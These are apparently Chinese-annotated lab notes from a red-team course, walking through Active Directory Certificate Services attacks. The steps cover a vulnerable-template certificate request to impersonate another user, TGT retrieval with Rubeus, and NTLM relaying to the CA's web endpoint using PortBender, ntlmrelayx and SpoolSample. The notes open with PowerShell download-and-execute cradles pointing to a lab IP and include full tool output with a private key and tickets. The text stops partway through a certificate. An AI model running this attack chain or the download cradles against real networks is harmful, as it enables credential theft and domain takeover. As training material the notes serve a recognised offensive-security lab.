powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"

powershell.exe  -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
# Finding Certificate Authorities

枚举域证书信息 


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660484464732.png)

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
[*] Tasked beacon to run .NET program: Certify.exe cas
[+] host called home, sent: 279617 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=cyberbotic,DC=io'


[*] Root CAs

    Cert SubjectName              : CN=ca-1, DC=cyberbotic, DC=io
    Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
    Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668
    Cert Start Date               : 2/25/2022 11:29:14 AM
    Cert End Date                 : 2/25/2047 11:39:08 AM
    Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io



[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : ca-1
    DNS Hostname                  : dc-1.cyberbotic.io
    FullName                      : dc-1.cyberbotic.io\ca-1
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ca-1, DC=cyberbotic, DC=io
    Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
    Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668
    Cert Start Date               : 2/25/2022 11:29:14 AM
    Cert End Date                 : 2/25/2047 11:39:08 AM
    Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
      Allow  ManageCA, ManageCertificates               CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
    Enrollment Agent Restrictions : None

....


    Enterprise CA Name            : ca-2
    DNS Hostname                  : dc-2.dev.cyberbotic.io
    FullName                      : dc-2.dev.cyberbotic.io\ca-2
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ca-2, DC=dev, DC=cyberbotic, DC=io
    Cert Thumbprint               : 2D0349C77D35808E35A7C6815CF37B51D9A5D431
    Cert Serial                   : 64000000067ED180604220703C000000000006
    Cert Start Date               : 3/1/2022 10:45:07 AM
    Cert End Date                 : 3/1/2024 10:55:07 AM
    Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io -> CN=ca-2,DC=dev,DC=cyberbotic,DC=io
    UserSpecifiedSAN              : Could not connect to the HKLM hive - The network path was not found.

    CA Permissions                :



Certify completed in 00:00:07.9411960

```


# Misconfigured Certificate Templates

使用[Certify](https://github.com/GhostPack/Certify)工具查找任何易受攻击的模板

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660484646273.png)

```
[+] received output:

[!] Vulnerable Certificates Templates :

    CA Name                               : dc-1.cyberbotic.io\ca-1
    Template Name                         : VulnerableUserTemplate
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Domain Users            S-1-5-21-378720957-2217973887-3501892633-513
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
      Object Control Permissions
        Owner                       : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
        WriteOwner Principals       : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
                                      CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
        WriteDacl Principals        : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
                                      CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
        WriteProperty Principals    : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
                                      CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519



Certify completed in 00:00:00.9969350

```


生成证书
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
```

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
[*] Tasked beacon to run .NET program: Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
[+] host called home, sent: 279765 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[*] Current user context    : CYBER\iyates
[*] No subject name specified, using current context as subject.

[*] Template                : VulnerableUserTemplate
[*] Subject                 : CN=Isabel Yates, CN=Users, DC=cyberbotic, DC=io
[*] AltName                 : nglover

[+] received output:

[*] Certificate Authority   : dc-1.cyberbotic.io\ca-1

[+] received output:

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 8

[+] received output:

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxhcCxbwqy9c8HKgEW1QFIivFTJxU4ML93+lcU+xluV0cwnkw
8oa8MuNlyEZmGGcJLJB4LVmx9f2C084nlKf6dZ3ybLVx+sxlsNsyso2QZKsVZg8d
ysqDgyr9aTtjwkePoqIXSzznsC79cVYKAnvINYKQNQoicU0PZPW11SNcQmdRzWeY
CNLRkVCOT2dnwHt7HszAhwFuAZ1pgA+IETIPR2UZTCToF9sUCTURDZh+p1BT4onb
OFiasyzw5Xvxt5KetTk2n8sfQ7Fk3fDQLuC8q9Pfeu4Jyunm6VH0OhAq+sRBgpSy
IFR5NSpl0AoA7cP0em6z4u2dz3EqPIKTYn2KowIDAQABAoIBABVUiv7h2TXj8lwf
l4CCFp9sWS17tAQT2ySOS1vaG8YPCbbDOAsViRRtuhsLwZilF67Ny7MOcoRLjRfj
ng163RRnMqCUFTbtZZHauKXTapX8eixoOkwI7IpmSa1YMNDNxeC8VYfLgiNNnArl
OeS0kYV5jq+3bKgIpTy43KCb0yZvKymtLcrxVjElP04g+ANe8FHvLfwTzH1AyueY
A1ITdeXFI3hvgYKn92nw4Pza7ZNl48WWfKyCK8OcCIjDp61ohswHG8Lpo1DppX8Z
hH1Iz4QpkBctjrnrkTjlBGhBu3xVT+CqdaSIE+5Z3fFGJhK8LlxIbc+f/pY9CpxN
ZIPF2vECgYEA1tgpyhlhnIXmg05Xb9HvuF7QmzvyxUq+cWD37vdlAtee19tWt3QE
MTHa65XbNfi5ScZHYh20RI/tgsVXKtnIkJ4NJ2zQ0PSpQq8y5n4L2ZWn4JJS9X8Z
Gg/JKiB2b1Q2Q5W8xwGTgXq/F94gFTsRQR+sFIoRXlWd7ct5rYEzQ9sCgYEA7Ak3
lY7VnUjQSe3vWeatADTGkaPxAD8dEW2YtSORMa8J3Y1IcTSZinCbl0Z6xji2Vuz7
iz4ERtZQSxcao8j+5tsjgYEQyerf/1SdD8mrd5C+545maPJ1BENFMj0Sy6VdaR8l
ZJKX4u0tObvug+FW/cawaJF+ig0L+jBkB67s8tkCgYA28w6tLBS1LeIpT045wV4o
r8d3DLwpDdbrtLt1GT1ynqd32hex0DCKTJALlUZ95WGuptH3HFXQ+2bp/YMv6IfN
xT7kCIbYCtuHvLuuDCsHuak4XPRu6dUHv2XaKndgPg+q9Y9U7uhFQ5nAhwV5qKPf
HjSrBC0xDYDZIyO55sOv5QKBgFTBdokosgH5fHmfi7v/fg295bO0Z7zL7PcuIJCi
xedOUD+TFPk5hwzUJLqsXzfAc5FBJY45ZbW+DTT5heJcMVPaSqSdINcwlOCNlJxv
sTeM7VAerR1wOp6ePUGt9orTxXgS7A1yKkIdIolBt4L5rpAQAZZ68DJIPw3GxJSR
tpn5AoGAcQm/0K3r6jIYwjyz8L7gS2tdNWpgDuU0kaqX0lmgn3iGUbAvObOo4D24
kNEcaF57d+C+hSMpDlB5/MZWCdax2rEoq8DqJTS2sOsHxWAFvkUZL6hMu6Z4Mug2
S5V9kgmIZjuGPciu9NM8KG8ZngOvW4x5rYE84y/PUsoyNdevecc=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGATCCBOmgAwIBAgITZAAAAAj35a/4E7TaTQAAAAAACDANBgkqhkiG9w0BAQsF
ADA/MRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMQ0wCwYDVQQDEwRjYS0xMB4XDTIyMDgxNDEzMzYzNFoXDTIzMDgxNDEzMzYz
NFowVzESMBAGCgmSJomT8ixkARkWAmlvMRowGAYKCZImiZPyLGQBGRYKY3liZXJi
b3RpYzEOMAwGA1UEAxMFVXNlcnMxFTATBgNVBAMTDElzYWJlbCBZYXRlczCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMYXAsW8KsvXPByoBFtUBSIrxUyc
VODC/d/pXFPsZbldHMJ5MPKGvDLjZchGZhhnCSyQeC1ZsfX9gtPOJ5Sn+nWd8my1
cfrMZbDbMrKNkGSrFWYPHcrKg4Mq/Wk7Y8JHj6KiF0s857Au/XFWCgJ7yDWCkDUK
InFND2T1tdUjXEJnUc1nmAjS0ZFQjk9nZ8B7ex7MwIcBbgGdaYAPiBEyD0dlGUwk
6BfbFAk1EQ2YfqdQU+KJ2zhYmrMs8OV78beSnrU5Np/LH0OxZN3w0C7gvKvT33ru
Ccrp5ulR9DoQKvrEQYKUsiBUeTUqZdAKAO3D9Hpus+Ltnc9xKjyCk2J9iqMCAwEA
AaOCAtwwggLYMDsGCSsGAQQBgjcVBwQuMCwGJCsGAQQBgjcVCIbIihb8ojyEoYc8
gvSPaMfvbFaFy4RIhvjECgIBZAIBAzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYB
BQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQo
MCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG
9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4D
AgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIBbzEYJ9gva21tK5IaQJZoczIhOMCIG
A1UdEQQbMBmgFwYKKwYBBAGCNxQCA6AJDAduZ2xvdmVyMB8GA1UdIwQYMBaAFK95
L8P8RbqLPv3ppNZfgCqo92odMIHBBgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFw
Oi8vL0NOPWNhLTEsQ049ZGMtMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vy
dmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1jeWJlcmJvdGlj
LERDPWlvP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFz
cz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuAYIKwYBBQUHAQEEgaswgagwgaUGCCsG
AQUFBzAChoGYbGRhcDovLy9DTj1jYS0xLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWN5YmVy
Ym90aWMsREM9aW8/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
ZmljYXRpb25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBAIALFOR5LVa2IKYo
HLhbNAlUtRJnBduhyBOjsqsmaV7+9BeAnskvV7ff/b55Qrju3AhjEFaYlOHuvS1i
CO3qLFzzUncuCFSF4GjChSrbteHhGSrZpftm2BdRWb7oVebLzYLGorSYjDEREBnM
Ng3ow6Ld04kPIXrT9VU2doVVGd6SA1r+aq1T8o/P5Uuv6jpPu63ktf0Q2IOZePY5
AHvKmMwGKRxQZXRLfWx8AC70jXL29QUOuvOjY9zSM6KAZXIFa7KR6xyKiZDKAXiI
fCDqDDzbuH8q+GwtgMrisk0OFMY0j1SG2Rx4qYlQK4g3nOcCznsLIkPAt7A8d6fS
UlykRQk=
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:15.2736817

```

复制上面证书内容到cert.pem，然后openssl输出成cert.pfx
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660484985024.png)


使用bases64输出证书
```
root@kali:~/Desktop# cat cert.pfx | base64 -w 0

MIIMtwIBAzCC......AgIIAA==

root@kali:~/Desktop#
```


使用上面证书生成tgt，**注意**，这里指定的**/password**参数是上面生成证书时输入的密码



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660485863234.png)

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:nglover /certificate:MIIMtwIBAzCC......AgIIAA== /password:123 /aes256 /nowrap

[*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:nglover /certificate:MIIMtwIBAzCC......AgIIAA== /password:123 /aes256 /nowrap
[+] host called home, sent: 594083 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGT


[+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: CN=Isabel Yates, CN=Users, DC=cyberbotic, DC=io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cyberbotic.io\nglover'

[+] received output:
[*] Using domain controller: 10.10.15.75:88

[+] received output:
[+] TGT request successful!

[+] received output:
[*] base64(ticket.kirbi):

      doIGDjCCBgqgAwIBBaEDAgEWooIFITCCBR1hggUZMIIFFaADAgEFoQ8bDUNZQkVSQk9USUMuSU+iIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDWN5YmVyYm90aWMuaW+jggTXMIIE06ADAgESoQMCAQKiggTFBIIEwa++YE9BsWEtpDmfgBkpOdZdwmxamBGJgrZeSgV1lC9T6UFiX1aL163MuXnHXoli+zDJqZPO5qV9DHk36E+eUW0JnaCb+1w/O4XGRd0i0meoi1sPW5oXlcA1/wH+/DSGy7NoaSRcoRo1me+tzeNCE1nReiDNNTmxZz2n/EHj6uuA8FkOIzrzUW36VCml03etNoJdH5B+9L1fq2emfqgRwt7o0dQ+v/i35S8EWyZfkNNdA9soks/jdNmjy4eaq2x1HvpYQ51P0mZRxpc0GKMc8mEfVFMiaiGMvf662eucBA+afu1bPFM25CJZFs3PzT0nHeDnbS3ZarOI4Z97Lm0cHPa+DFNgGuSZoEAhL1FaFiphkeOTLkceqXxs/f3QcXmnRywnYwAxuwUyhCBhN6+ujFpwGruovxRdA+QJHJRocC8n0opY8EEKEElt4vTVCrEue1e6CKzRa96yYebHbnON2ePhwZvBqDU26AmptKPnv7MM1V3iNgkx/jhmET90/kmfe4HbqcuZUKkeZbbhGqwydaSwO8cTaBXkKsHWY2i/P2k+69ZQboy4+KkVjPsnPB7ko9IxfQ3oJ/4g0F5UStStzJvk5B9DZ22fN1etAn1ruNA4QZmYbwE71LY4OfrKVhkgee0Q/Jp4K6Q8tVwuIPJbz8lsD2upcuCeZQuvaTuaRWAZVOiOnIu1yqmBAnPafnFRMyr/BoyUTT28VxG9GnX1tz7EiqLW2axc2FfZ9QxbfoUtdPJF5bu3SbK6XFEH55mIcnsduMV5RJj6PDST3fVOIDd0Vy2IM0dzd4LRxhlItHYTNEE6dDWsScadF6NJDV0LV/MenbTiVKDfLn1h/Hle601xM0dC7Bmz7AV9jxSmTTVa6wECX7EZLXBPgUQQWZ4UyirnADThugopH4uou4vgPqHXNb3ow9g7NULgeLpqSKhHcC/UBxhapJ5XEMbOZMYIfsa9j0NfxU+ilvj9EZVMOGbAzFEL5JyM4xi4/jCK3y0ChkAZZEIM7/abBA2RgijgxvONbartWWYt5zwQv0Wwr6BZ9KqYfm8TmuoIaYBdnXlIGM/ZM3bbn+Ki74y8X/64ZD3OLldApjg3R/f7jfiz71LK2vynASadoRwKLN1xH67CSwf9Did/9rErr8f36f+i0wTvv/rQPJXArGEXqktbQztkgkGsf/4BqcP00Q7XwejmvTQyiW7R4xlp2qqhRZnFOXDFkFeGHsCoy4bbZJiMb1cMFI5CaSryQZ/ByBO3W/1kqqk9mOM2clK2nDCrceA72UI6nzbJeYi5utesdfcl3Xt//LUh+lNePIIQaMqm+WUp+/uAcqkJ5zJPSiExK3aC4mXe1woF6P8ZmNu+/rjOTkACYE6Zi8MIXRZfbKrBkmMWKn2aqBg9kUNaKkbBEEYizSWMS2yHmfkeEHe+scZYvbLHewKLlC2Ae8f3Mr+G6XTbqDZ2bsX7pSGPvhMHDAsHI1ncMOgk3H5I8BfiTjKAIDyNq5Sbh+KyCilI++JEOy997Y2UrAqcBxi276gIGtO7hbUAItxTFco8Gi4oxa8YumdXxuZeUzPS1VLi9M6rZX/BUFbusqUtqrerqsaP3xsH8GvAQW8N7NKV4qJ6Jf91y9Ilo4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugGzAZoAMCARehEgQQwyDald3/L7j0qZ/Bd7vVqKEPGw1DWUJFUkJPVElDLklPohQwEqADAgEBoQswCRsHbmdsb3ZlcqMHAwUAQOEAAKURGA8yMDIyMDgxNDE0MDAwMFqmERgPMjAyMjA4MTUwMDAwMDBapxEYDzIwMjIwODIxMTQwMDAwWqgPGw1DWUJFUkJPVElDLklPqSIwIKADAgECoRkwFxsGa3JidGd0Gw1jeWJlcmJvdGljLmlv

  ServiceName              :  krbtgt/cyberbotic.io
  ServiceRealm             :  CYBERBOTIC.IO
  UserName                 :  nglover
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  8/14/2022 2:00:00 PM
  EndTime                  :  8/15/2022 12:00:00 AM
  RenewTill                :  8/21/2022 2:00:00 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  wyDald3/L7j0qZ/Bd7vVqA==
  ASREP (key)              :  92E1616B29013121E4004AB70FF7D03F



```


拿到tgt,制作票据
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\nglover.kirbi", [Convert]::FromBase64String("doIGDjC...WJlcmJvdGljLmlv"))
```


导入ticket，访问dc-1


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660486344943.png)

# NTLM Relaying to ADCS HTTP Endpoints

1. 在srv-1上转发端口


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660521756280.png)

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection

[*] Tasked beacon to spawn PortBender
[+] host called home, sent: 53812 bytes
[+] received output:
 _______                        __      _______                             __                           
/       \                      /  |    /       \                           /  |                        
$$$$$$$  | ______    ______   _$$ |_   $$$$$$$  |  ______   _______    ____$$ |  ______    ______        
$$ |__$$ |/      \  /      \ / $$   |  $$ |__$$ | /      \ /       \  /    $$ | /      \  /      \ 
$$    $$//$$$$$$  |/$$$$$$  |$$$$$$/   $$    $$< /$$$$$$  |$$$$$$$  |/$$$$$$$ |/$$$$$$  |/$$$$$$  |      
$$$$$$$/ $$ |  $$ |$$ |  $$/   $$ | __ $$$$$$$  |$$    $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/       
$$ |     $$ \__$$ |$$ |        $$ |/  |$$ |__$$ |$$$$$$$$/ $$ |  $$ |$$ \__$$ |$$$$$$$$/ $$ |          
$$ |     $$    $$/ $$ |        $$  $$/ $$    $$/ $$       |$$ |  $$ |$$    $$ |$$       |$$ |            
$$/       $$$$$$/  $$/          $$$$/  $$$$$$$/   $$$$$$$/ $$/   $$/  $$$$$$$/  $$$$$$$/ $$/             
                                                                                                         
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP

beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445
[*] Tasked beacon to forward port 8445 to 127.0.0.1:445
[+] host called home, sent: 10 bytes
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```


2. kali开启ntlmrelayx，10.10.15.75是dc-1的ip

```
proxychains ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660521808537.png)


3. 利用SpoolSample.exe,强制10.10.15.254（WKSTN-3）向10.10.17.25（SRV-1）认证

```
execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe 10.10.15.254 10.10.17.25
```


4. kali收到tgt


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660522044250.png)

```
[*] GOT CERTIFICATE! ID 10
[*] Base64 certificate of user WKSTN-3$: 
MIIQ3QIBAzCCEKcGCSqGSIb3DQEHAaCCEJgEghCUMIIQkDCCBscGCSqGSIb3DQEHBqCCBrgwgga0AgEAMIIGrQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIVMVp5Arb6k8CAggAgIIGgLMaDXP05SeTmMfSvSlmloiz+R7Zkxs9s8OiG3fnJIQrDiuhMHxLKc1Dx+t9KeOGSDo2m9M8dN4tY1HBuD+XdpPwAQf7pwgv+nL8dR7A0PPhD1XouoBSzYjiY127tel+EOHz5/U/K+BdGMRdQe/gPtd7Ttfb4Pu7UuOTEC/tro+nFOPAnCSi7v8c+g71vKfCkDO2HhOMxJWCFEAJeFvss1UPpp995Y4OXh7GDVfbsE/kxFQSSwF4bqj7C3op0HIdcYNn76bZubaq/2R1bklE8KeNDauFAMGP9oUiY83OC9fy0i6SrxDOt20afJBXf7YiPA64mUoiIzwS73npNGiO1tQPz8tts8cD/oEzTsyHQ7XyddLZF2fbZgFiQz1a62DIvI2NZ2DI0ogR4HnKU6RjwyaDimYDduqb8yQ+mtQcnSOmELwwUAhhBCCpBVSLFTNzTtkJzDyivObZzfgnjRHdDA3AVnkN2mJmwdvrnfJ94JPrHHunJPEhZ2q/cEsOI23i6RGE56B8qZxMjddNmDdokwT6wZcVnYLuGNxiVwAljlxGKKr5xd44Wa8jj1WFg23dMP4lf5QtDbGNmPTjdxpuHbIETc6LtpwqZKUjN6iQoNCxFqwOeML8UD9e1z+oB5ahKyJ08beep6fuQU3RK9Qw9n3u2t4aiXQ9tiAyicfWKM4QUrbgmZsdcODhGnLA7u8wmn+NDLlQ+9ffK7zEOGuo8HpkpdJqlsAWkhjEoGsuYGHhvfkcgTfGv2s1KPpX9dPj8SDbzjK4ncHwVkuGgkVDsmSaR+gWeQpneVTa1LPjdKVkiyqqEhaOqb08Sq6ucE1UeKFmRVwDD/s9pLtgAW/z/OYnR6vkdUUGfWs+/hEckk0uZYikh8jo/OGWzDgT+MxL4T/OYyqIZx4BrWfQNF4qHdVrjABm+yZUEATDeLS5wsVQ4P5hJxSuI8ybFt1ZAZdh8gLIle7Woi2UnNqne3vm4dDNF7Ra3rrbjAmaeZxeR7mjPhF/0DcZUJub2mjiy1gmxLVptwbpSt1+scNhuwZYN0Hbm7rjSJEsZaEt4aidOg1wTrW/BYu0X4XDLFC/HAK9lstliN+TroO/Y0DRXFpprDulBkiayW9+zY+AmJKrD7sAlPo8HrJmR2RLMECe0OvP6Ur4zDg9X98998no6h6nZFu2ccCCzZHGFhFLGlKC1DlVTXhMghjxu8sCTYIytUxa/T3rE5Vedqq21cUkoG6Dy7XWU2RBYEshTPUgUooO72OK5+4EDiV2+h/m2abVhUUaqMGz8wO0PayVlBgQS9e3uXzA6jkshN6r2mwbd+hkWv/pO35o0polF2+6IB9IYufQI2iod7xUB8qZghy1UGjwxQ7wfztJC+b10SvEBlNZr8uv/ip7nMfwVfO3cEQln668W/3xPmqhxUQh1QWiW0lL9q30aa/Oc/qayDCpx/b/krwkwsKLfNbIz5e8pZgFpBBE86zuTt2z07HDwCYyik9M5IcapRmHDz7mvAn1MftogzftSvU+JCMCz4faohSNQvwNE2671KNVxnr2g5hiPCdl5TVWI1ck2ximyBmbsQiKWVQUbh2dAGQt45C8372YraOxioKV98tZ5ZgKze3ZW7E+ZDsAwfIS2Kxqf8pSEJS3E7kbSB8aEabwB9N8dUGCveAl6WRBW7B6MT7B9KMs1WRgiF4XT05taWqZfRduvINFpfqOyC1EydFySac0ejAolrWEsNaegq0xjHUVm9EuMp4KZQoXI4olrJB6IwbakTTZGGXuyNxzRjefxQe5qQaY6OIxmC9Ot5eIOhEy0ryYvTGIVe01OvJ6NaC8Q/aGRQYdKzpv5a/VYcv+R+OMchyyWCUvn+CYjLoinnHSrFJAozP+rcG0XVZM61+lVUpieXvUECNmSfz1mN97dj9Nm/wdIzKd1FWvoyD8PFoYhcZHkGABrFPbCJIwIX7UwrmbiTsvVEL8AvqwtvITvP9GDjpUxsxjEcr9lerlys7zWolpBp6WBtWXi8uaKtU7RafSaf+/tHNDblGMH8oqaPw+dgOrvtk+j8Yrr9TdmLPqWGIms3TL9XuHMLXDEsJI++5OY3gZB/yFAHx93NjLsIFaIDwVh7gaFiht+2T9Pg5d6y5MU/hDE0QAoKE56PfFPpab8HkCWpg+a2Eugzt0pgnedrXh6JF08xWlNKlq3WSt/JsaxPGLeo6KWT4YT107R1340Fg0qmD7MIIJwQYJKoZIhvcNAQcBoIIJsgSCCa4wggmqMIIJpgYLKoZIhvcNAQwKAQKgggluMIIJajAcBgoqhkiG9w0BDAEDMA4ECO5/Hou9f/zvAgIIAASCCUiSbSCzvr+auJdkcrXYj0NZ7KeVA1jSgyHzdJhQRREPYBg5miLw2gGzoF4FQXJYyp7GgH61jxYGO8Tks/RidjwdEyyfgSSnT62+kIE3R45snD1UsdRJQ5OTA1j1SuVOl6aAI8E1ix+a56Hz/NMmY5C4Nr0ozVeWvwR75fW1APMTF6252S42dtutVGz8FxsJBV+9ZH79ZVdzYkG9ECNvFpATjFU+/QCrnK85Iv89YA4VK2aIWlv2VUKJiVtxZHE9tZx4czAo59NIm7zmInJ6zLDLzJB3q/m68mQwaPzhS9wXJ87ynUZPagQEjrZOCUoQLDEcPYZdN7hfKOvR7UcFU6r8ATV3nWDGWMw8AoWGfT7k3HmU4/wV0x1DeV0hbRWS72t6MBBhsjrHo/BqFDX47AgVPy76JEENDuWbOE45AQKvjos9WJto+K2DWNc9i/CBaCFo2RAbwdMoVxQMnjDNc15vyqrLlmC/gd6nnbd6eExOxU20H01pzAlaFzm7i6Dd2crkDTV4TUKcp4PMqey8fn7JE1azw3dEKTfjLDXAtqrXVNCCuLHbSQWc95Zdf+5ffjg6qkbtrG/Ycu5Aj8K3P2xc0Bt3eOaUwBfKyLbj+6XUbSaS/F2Prj3NhBCnW8F87EqW9dMnde9iSL1BDC6pzHRlSfCZafBzCqfyujnx1wbAEQETgwBsnfPdxeCzmuZjQEljpuGLHEH6eA2cRGamL3Zt8WZP2wb7Vg+bjAhix6NvGpC6hDJAuYg64zIZ5PpOiFPtsrM3irVd42wmsEexxKIRVzzCSn1C7m8KxlDQpsuL8U2PChCziv/wnOiS8avfJbV0Cqw9TyBcNVHcz4JmR+fODtvqJsBoA4e7JyzX/v6h2D9sbMh3kx5sclSMOu/IIc/Nlq4MR9OV+8uQThqMmu0C22pPuX7UrlaaLj0b82CsZyPTC9bv8kgyCRBOhJgF5HUKx8o8cde1E/XuidkLHm/9teYZMwNa9YDBCT8MU/C+A4vlNhONkObUhgtV6VyAsa+FBXfYJQRnBLbk5ixBvS75CZU89bu8SgWpiQ40uEubQ17RSk3od+1K36Xw7uIl/I6P7m2PYdR7PsFUUYAF0R+A8v1cPb8i1IqOEVBehTg7MkD+csQvqQB2ohuSVoUUVb0v0mKux0LuYML8F5tkPxH4AvU4Nq4Du+